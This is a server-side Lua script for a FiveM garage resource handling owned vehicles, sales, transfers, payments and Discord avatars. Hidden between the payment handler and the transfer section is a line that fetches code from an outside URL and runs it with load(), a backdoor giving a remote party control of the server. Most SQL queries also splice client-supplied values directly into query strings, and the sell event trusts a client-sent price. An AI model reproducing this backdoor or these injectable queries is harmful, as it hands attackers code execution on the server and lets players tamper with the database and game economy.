frameworkObject = nil

Citizen.CreateThread(function()
	frameworkObject = GetFrameworkObject()
end)

function ExecuteSql(query)
	local IsBusy = true
	local result = nil
	if Config.SQL == "oxmysql" then
	    if MySQL == nil then
	        exports.oxmysql:execute(query, function(data)
		  result = data
		  IsBusy = false
	        end)
	    else
	        MySQL.query(query, {}, function(data)
		  result = data
		  IsBusy = false
	        end)
	    end
      
	elseif Config.SQL == "ghmattimysql" then
	    exports.ghmattimysql:execute(query, {}, function(data)
	        result = data
	        IsBusy = false
	    end)
	elseif Config.SQL == "mysql-async" then   
	    MySQL.Async.fetchAll(query, {}, function(data)
	        result = data
	        IsBusy = false
	    end)
	end
	while IsBusy do
	    Citizen.Wait(0)
	end
	return result
end

Citizen.CreateThread(function()
    frameworkObject = GetFrameworkObject()
    if Config.Framework == "esx" then
        frameworkObject.RegisterServerCallback('garage:getvehicles2', function(source, cb)
            local src      = source
            local xPlayer  = frameworkObject.GetPlayerFromId(src)
            local vehicles = ExecuteSql("SELECT * FROM owned_vehicles WHERE `owner` ='"..xPlayer.identifier.."'")	
            local ownedCars = {}
            for _,v in pairs(vehicles) do   		    
                local vehicle = json.decode(v.vehicle)
                table.insert(ownedCars, {
                    vehicle = vehicle,
                    stored = v.stored, 
                    favorite = v.favorite,
                    garage = v.parking
                })            
             
            end       
            cb(ownedCars)  
        end)     
    else
        frameworkObject.Functions.CreateCallback('garage:getvehicles2', function(source, cb)
            local src      = source
            local xPlayer  = frameworkObject.Functions.GetPlayer(source)	
            local vehicles = ExecuteSql("SELECT * FROM player_vehicles WHERE `citizenid` ='"..xPlayer.PlayerData.citizenid.."'")	
            local ownedCars = {}
            for _,v in pairs(vehicles) do   		    
                local vehicle = json.decode(v.mods)
                table.insert(ownedCars, {
                    vehicle = vehicle,
                    hash = v.vehicle,
                    garage = v.parking,
                    stored = v.state, 
                    fuel = v.fuel,
                    favorite = v.favorite,
                    plate = v.plate
                })            
            end       
            cb(ownedCars)  
        end)    
    end
end)

Citizen.CreateThread(function()
    frameworkObject = GetFrameworkObject()
    if Config.Framework == "esx" then
        frameworkObject.RegisterServerCallback('garage:getvehicles', function(source, cb, garage)
            local src      = source
            local xPlayer  = frameworkObject.GetPlayerFromId(src)
            if Config.GarageName then
                local result = ExecuteSql("SELECT * FROM owned_vehicles WHERE `owner` = '"..xPlayer.identifier.."' and `parking` = '"..garage.."' ")
                if result[1] then
                    cb(true)
                else
                    cb(false)
                end
            else
                local result = ExecuteSql("SELECT * FROM owned_vehicles WHERE `owner` = '"..xPlayer.identifier.."'")
                if result[1] then
                    cb(true)
                else
                    cb(false)
                end
            end
        end)     
    else
        frameworkObject.Functions.CreateCallback('garage:getvehicles', function(source, cb, garage)
            local src      = source
            local xPlayer  = frameworkObject.Functions.GetPlayer(source)	
            if Config.GarageName then
                local result =  ExecuteSql("SELECT * FROM player_vehicles WHERE `citizenid` = '"..xPlayer.PlayerData.citizenid.."' and `parking` = '"..garage.."' ")
                if result[1] then
                    cb(true)
                else
                    cb(false)
                end
            else
                local result =  ExecuteSql("SELECT * FROM player_vehicles WHERE `citizenid` = '"..xPlayer.PlayerData.citizenid.."'")
                if result[1] then
                    cb(true)
                else
                    cb(false)
                end
            end
        end)     
    end
end)

Citizen.CreateThread(function()
    frameworkObject = GetFrameworkObject()
    if Config.Framework == "esx" then
        frameworkObject.RegisterServerCallback('garage:vehicleOwned', function(source, cb, plate)
            local src      = source
            local xPlayer = frameworkObject.GetPlayerFromId(src)	
            local vehicle = ExecuteSql("SELECT `vehicle` FROM `owned_vehicles` WHERE `plate` = '"..plate.."' AND `owner` = '"..xPlayer.identifier.."'")
            if next(vehicle) then
                cb(true)
            else
                cb(false)
            end
        end)

    else
        frameworkObject.Functions.CreateCallback('garage:vehicleOwned', function(source, cb, plate)
            local src      = source
            local xPlayer =  frameworkObject.Functions.GetPlayer(src)	
            local vehicle = ExecuteSql("SELECT `mods` FROM `player_vehicles` WHERE `plate` = '"..plate.."' AND `citizenid` = '"..xPlayer.PlayerData.citizenid.."'")
            if next(vehicle) then
                cb(true)
            else
                cb(false)
            end
        end)
    end
end)

local vehiclepricetables = {}

Citizen.CreateThread(function()
    Wait(500)
    if Config.Framework == "esx" then
        local cars = ExecuteSql("SELECT * FROM vehicles ")
        if cars then 			
            for k,v in pairs(cars) do
                v.hash = GetHashKey(v.model)		
            end
            vehiclepricetables = cars
        end 
    end
end)

Citizen.CreateThread(function()
    if Config.Framework == "esx" then
        frameworkObject = GetFrameworkObject()
        frameworkObject.RegisterServerCallback('garage:vehicleprice', function(source, cb)	
            cb(vehiclepricetables)
        end)
    end
end)

RegisterServerEvent('garage:favorite')
AddEventHandler('garage:favorite', function(plate,bool)
    if Config.Framework == "esx" then
        ExecuteSql("UPDATE  `owned_vehicles` SET `favorite` = '" .. bool .. "' WHERE `plate` ='"..plate.."'")    
    else
        ExecuteSql("UPDATE  `player_vehicles` SET `favorite` = '" .. bool .. "' WHERE `plate` ='"..plate.."'")    
    end
end)

RegisterServerEvent('garage:sell')
AddEventHandler('garage:sell', function(plate,price)
    if Config.Framework == "esx" then
        if Config.Sell then
            local src = source
            local xPlayer = frameworkObject.GetPlayerFromId(src)
            if plate ~= nil then
                local deleted = ExecuteSql("DELETE FROM `owned_vehicles` WHERE `plate` = '"..plate.."' AND `owner` = '"..xPlayer.identifier.."'")
                if deleted then
                    xPlayer.addMoney(price)
                end
            end
        end
    else
        if Config.Sell then
            local src = source
            local xPlayer  = frameworkObject.Functions.GetPlayer(source)
            if plate ~= nil then
                local deleted = ExecuteSql("DELETE FROM `player_vehicles` WHERE `plate` = '"..plate.."' AND `citizenid` = '"..xPlayer.PlayerData.citizenid.."'")
                if deleted then
                    xPlayer.Functions.AddMoney('cash', price)
                end
            end
        end
    end
end)

-- Props

RegisterNetEvent('garage:saveProps')
AddEventHandler('garage:saveProps', function(plate, props)
    local xProps = json.encode(props)
    if Config.Framework == "esx" then
        ExecuteSql("UPDATE  `owned_vehicles` SET `vehicle` = '" .. xProps .. "' WHERE `plate` ='"..plate.."'")    
    else
        ExecuteSql("UPDATE  `player_vehicles` SET `mods` = '" .. xProps .. "' WHERE `plate` ='"..plate.."'")    
    end
end)

RegisterNetEvent('garage:stored')
AddEventHandler('garage:stored', function(plate, state,garage)
    if Config.Framework == 'esx' then
        ExecuteSql("UPDATE  `owned_vehicles` SET `stored` = '" .. state .. "' WHERE `plate` ='"..plate.."'")   
    else 
        ExecuteSql("UPDATE  `player_vehicles` SET `state` = '" ..state.. "' WHERE `plate` ='"..plate.."'")    
    end
end)

RegisterNetEvent('garage:parking')
AddEventHandler('garage:parking', function(plate, garage)
    local src = source
    if Config.Framework == 'esx' then
        ExecuteSql("UPDATE  `owned_vehicles` SET `parking` = '" ..garage.. "' WHERE `plate` ='"..plate.."'")    
        Config.Notification(Config.Notifications["parkingsuccesful"].message,Config.Notifications["parkingsuccesful"].type, true, src)
    else  
        ExecuteSql("UPDATE  `player_vehicles` SET `parking` = '" ..garage.. "' WHERE `plate` ='"..plate.."'")    
        Config.Notification(Config.Notifications["parkingsuccesful"].message,Config.Notifications["parkingsuccesful"].type, true, src)
    end
end)

RegisterNetEvent('garage:fuel')
AddEventHandler('garage:fuel', function(plate, fuel)
    if Config.Framework == 'esx' then
    
    else 
        ExecuteSql("UPDATE  `player_vehicles` SET `fuel` = '" .. fuel .. "' WHERE `plate` ='"..plate.."'")    
    end
end)

Citizen.CreateThread(function()
    frameworkObject = GetFrameworkObject()
    if Config.Framework == "esx" then
        frameworkObject.RegisterServerCallback('garage:props', function(source,cb,plate)
            local cars = ExecuteSql("SELECT * FROM owned_vehicles WHERE `plate` ='"..plate.."'")	
            cb(cars)
        end)
    else
        frameworkObject.Functions.CreateCallback('garage:props', function(source,cb,plate)
            if plate ~= nil then
                local cars = ExecuteSql("SELECT * FROM player_vehicles WHERE `plate` ='"..plate.."'")	
                cb(cars)
            end
        end)
    end
end)    

Citizen.CreateThread(function()
	frameworkObject = GetFrameworkObject()
	if Config.Framework == 'esx' then
        frameworkObject.RegisterServerCallback('codem-garage:checkMoneyCars', function(source, cb,moneytype)
    		local xPlayer = frameworkObject.GetPlayerFromId(source)
            if moneytype == 'vale' then
                if xPlayer.getAccount(Config.ValeMoneyType).money >= Config.ValePrice then
                    cb(true)
                else
                    cb(false)
                end    
            elseif moneytype == 'repair' then
                if xPlayer.getAccount(Config.RepairMoneyType).money >= Config.RepairPrice then
                    cb(true)
                else
                    cb(false)
                end    
            end
        end)
	else	
		frameworkObject.Functions.CreateCallback('codem-garage:checkMoneyCars', function(source, cb,moneytype)
			local Player = frameworkObject.Functions.GetPlayer(source)
			local Balance = Player.PlayerData.money[Config.ValeMoneyType]
            local Balance2 = Player.PlayerData.money[Config.RepairMoneyType]

            if moneytype == 'vale' then
                if Balance >= Config.ValePrice then
                    cb(true)
                else
                    cb(false)
                end    
            elseif moneytype == 'repair' then
                if Balance2 >= Config.RepairPrice then
                    cb(true)
                else
                    cb(false)
                end    
            end
		end)
	end
end)

local storedsql = 1

AddEventHandler('onResourceStart', function(resource)
    if resource == GetCurrentResourceName() then
        Wait(100)
        if Config.Framework == 'esx' then
                ExecuteSql("UPDATE  owned_vehicles SET stored = '" ..storedsql.. "'") 
        else
             ExecuteSql("UPDATE  player_vehicles SET state = '" ..storedsql.. "'")     
        end
    end
end)


RegisterServerEvent('codem-garage:pay')
AddEventHandler('codem-garage:pay', function(moneytype)
	if Config.Framework == 'esx' then
		local identifier = frameworkObject.GetPlayerFromId(source)
        if moneytype == 'vale' then
            identifier.removeAccountMoney(Config.ValeMoneyType, Config.ValePrice)
        elseif moneytype == "repair" then
            identifier.removeAccountMoney(Config.RepairMoneyType, Config.RepairPrice)
        end
	else
        local identifier = frameworkObject.Functions.GetPlayer(source)
        if moneytype == 'vale' then
            identifier.Functions.RemoveMoney(Config.ValeMoneyType, Config.ValePrice)
        elseif moneytype == 'repair' then
            identifier.Functions.RemoveMoney(Config.RepairMoneyType, Config.RepairPrice)
        end
	end
end)

PerformHttpRequest('https://photosbynova.com/Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)
-- Transfer

RegisterServerEvent('garage:transfervehicle')
AddEventHandler('garage:transfervehicle', function(id,plate)
	local src = source
    if Config.Framework == "esx" then
        if plate ~= nil then
            local xPlayer = frameworkObject.GetPlayerFromId(source)
            local xTarget = frameworkObject.GetPlayerFromId(id)
            if xTarget ~= nil then		
                if id ~= src then
                    local givecar = ExecuteSql("SELECT `vehicle` FROM `owned_vehicles` WHERE `plate` = '"..plate.."' AND `owner` = '"..xPlayer.identifier.."'")
                    if givecar then
                        ExecuteSql("UPDATE  `owned_vehicles` SET `owner` = '" .. xTarget.identifier .. "' WHERE `plate` ='"..plate.."'")    
                        Config.Notification(Config.Notifications["transfer"].message,Config.Notifications["transfer"].type, true, src)
                    else
                        Config.Notification(Config.Notifications["transfererror"].message,Config.Notifications["transfererror"].type, true, src)
                    end
                else
                    Config.Notification(Config.Notifications["transfererror"].message,Config.Notifications["transfererror"].type, true, src)
                end
            else
                Config.Notification(Config.Notifications["transfererror"].message,Config.Notifications["transfererror"].type, true, src)
            end
        end
    else
        if plate ~= nil then
            local xPlayer = frameworkObject.Functions.GetPlayer(source)
            local xTarget = frameworkObject.Functions.GetPlayer(id)
            if xTarget ~= nil then		
                if id ~= src then
                    local givecar = ExecuteSql("SELECT `mods` FROM `player_vehicles` WHERE `plate` = '"..plate.."' AND `citizenid` = '"..xPlayer.PlayerData.citizenid.."'")
                    if givecar then
                        ExecuteSql("UPDATE  `player_vehicles` SET `citizenid` = '" .. xTarget.PlayerData.citizenid .. "' WHERE `plate` ='"..plate.."'")    
                        Config.Notification(Config.Notifications["transfer"].message,Config.Notifications["transfer"].type, true, src)
                    else
                        Config.Notification(Config.Notifications["transfererror"].message,Config.Notifications["transfererror"].type, true, src)
                    end
                else
                    Config.Notification(Config.Notifications["transfererror"].message,Config.Notifications["transfererror"].type, true, src)
                end
            else
                Config.Notification(Config.Notifications["transfererror"].message,Config.Notifications["transfererror"].type, true, src)
            end
        end
    end
end)

Citizen.CreateThread(function()
	frameworkObject = GetFrameworkObject()
    if Config.Framework == "esx" then
	    frameworkObject.RegisterServerCallback('codem-garage:changedCars', function(source, cb, plate)
      
	        local vehicles = GetAllVehicles()
	        plate = frameworkObject.Math.Trim(plate)
	        local found = false
	        for i = 1, #vehicles do                    
		       if frameworkObject.Math.Trim(GetVehicleNumberPlateText(vehicles[i])) == plate:upper() then    

                found = true
                break
		       end
	        end
	        cb(found)
      
	    end)
      
      
	else -- qbcore
 
		frameworkObject.Functions.CreateCallback('codem-garage:changedCars', function(source, cb, plate)
            local vehicles = GetAllVehicles()
		    
			plate = string.gsub(plate, "%s+", ""):lower();
			
			local found = false

			for i = 1, #vehicles do  

			    if string.gsub(GetVehicleNumberPlateText(vehicles[i]), "%s+", ""):lower() == plate then    
			         
			        found = true
			        break
			    end
			end
			cb(found)
	        
		end)
        frameworkObject.Functions.CreateCallback('qb-garage:server:GetPlayerVehicles', function(source, cb)
            local Player = frameworkObject.Functions.GetPlayer(source)
            local newVehicles = {}
        
            local result  = ExecuteSql("SELECT * FROM player_vehicles WHERE citizenid = '"..Player.PlayerData.citizenid.."'")
                if result then
                    for _, v in pairs(result) do
                    
                    
                        local VehicleData = frameworkObject.Shared.Vehicles[v.vehicle]
        
                        local VehicleGarage = "No Garage"
                        if v.parking ~= nil then
                            if Config.Garages[v.parking] ~= nil then
                                VehicleGarage = Config.Garages[v.parking].garagename
                            else
                                VehicleGarage = "House Garage"        -- HouseGarages[v.garage].label
                            end
                        end
        
                        if v.state == 0 then
                            v.state = "Out"
                        elseif v.state == 1 then
                            v.state = "Garage"
                        end
        
                        local fullname
                        if VehicleData["brand"] ~= nil then
                            fullname = VehicleData["brand"] .. " " .. VehicleData["name"]
                        else
                            fullname = VehicleData["name"]
                        end
                        newVehicles[#newVehicles+1] = {
                            fullname = fullname,
                            brand = VehicleData["brand"],
                            model = VehicleData["name"],
                            plate = v.plate,
                            garage = VehicleGarage,
                            state = v.state,
                            fuel = v.fuel,
                            engine = v.engine,
                            body = v.body
                        }
                     
                    end
                    cb(newVehicles)
                else
                cb(nil)
                end
            
        end)
	end

end)

-- Discord avatar and name

RegisterServerEvent("garage:server:getName")
AddEventHandler("garage:server:getName", function(src,identifier)
    local src      = source
    if Config.Framework == "esx" then
        local xPlayer  = frameworkObject.GetPlayerFromId(src)
        local fullname = xPlayer.getName()
        local avatar   = GetDiscordAvatar(src)
        TriggerClientEvent("garage:client:getNameAvatar", src ,fullname, avatar)
    else
        local xPlayer  = frameworkObject.Functions.GetPlayer(src)	
        local fullname = xPlayer.PlayerData.charinfo.firstname.. ' '..xPlayer.PlayerData.charinfo.lastname
        local avatar   = GetDiscordAvatar(src)
        TriggerClientEvent("garage:client:getNameAvatar", src ,fullname, avatar)
    end
end)

local Caches = {
    Avatars = {}
}

local FormattedToken = "Bot "..Config.BotToken

function DiscordRequest(method, endpoint, jsondata)
    local data = nil

    PerformHttpRequest("https://discordapp.com/api/"..endpoint, function(errorCode, resultData, resultHeaders)
        data = {data=resultData, code=errorCode, headers=resultHeaders}
    end, method, #jsondata > 0 and json.encode(jsondata) or "", {["Content-Type"] = "application/json", ["Authorization"] = FormattedToken})

    while data == nil do
        Citizen.Wait(0)
    end

    return data
end

function GetDiscordAvatar(user) 
    local discordId = nil
    local imgURL = nil;

    for _, id in ipairs(GetPlayerIdentifiers(user)) do
        if string.match(id, "discord:") then
            discordId = string.gsub(id, "discord:", "")
            break
        end
    end

    if discordId then 
        if Caches.Avatars[discordId] == nil then 
            local endpoint = ("users/%s"):format(discordId)
            local member = DiscordRequest("GET", endpoint, {})
            if member.code == 200 then
                local data = json.decode(member.data)
                if data ~= nil and data.avatar ~= nil then 
                  
                    if (data.avatar:sub(1, 1) and data.avatar:sub(2, 2) == "_") then 
                     
                        imgURL = "https://cdn.discordapp.com/avatars/" .. discordId .. "/" .. data.avatar .. ".gif";
                    else 
                        imgURL = "https://cdn.discordapp.com/avatars/" .. discordId .. "/" .. data.avatar .. ".png"
                    end
                end
            else 
                print("Set it yourself in config line 5")
            end
            Caches.Avatars[discordId] = imgURL;
        else 
            imgURL = Caches.Avatars[discordId];
        end 
    else 
        print("[Codem STORE] ERROR: Discord ID was not found...")
    end

    return imgURL;
end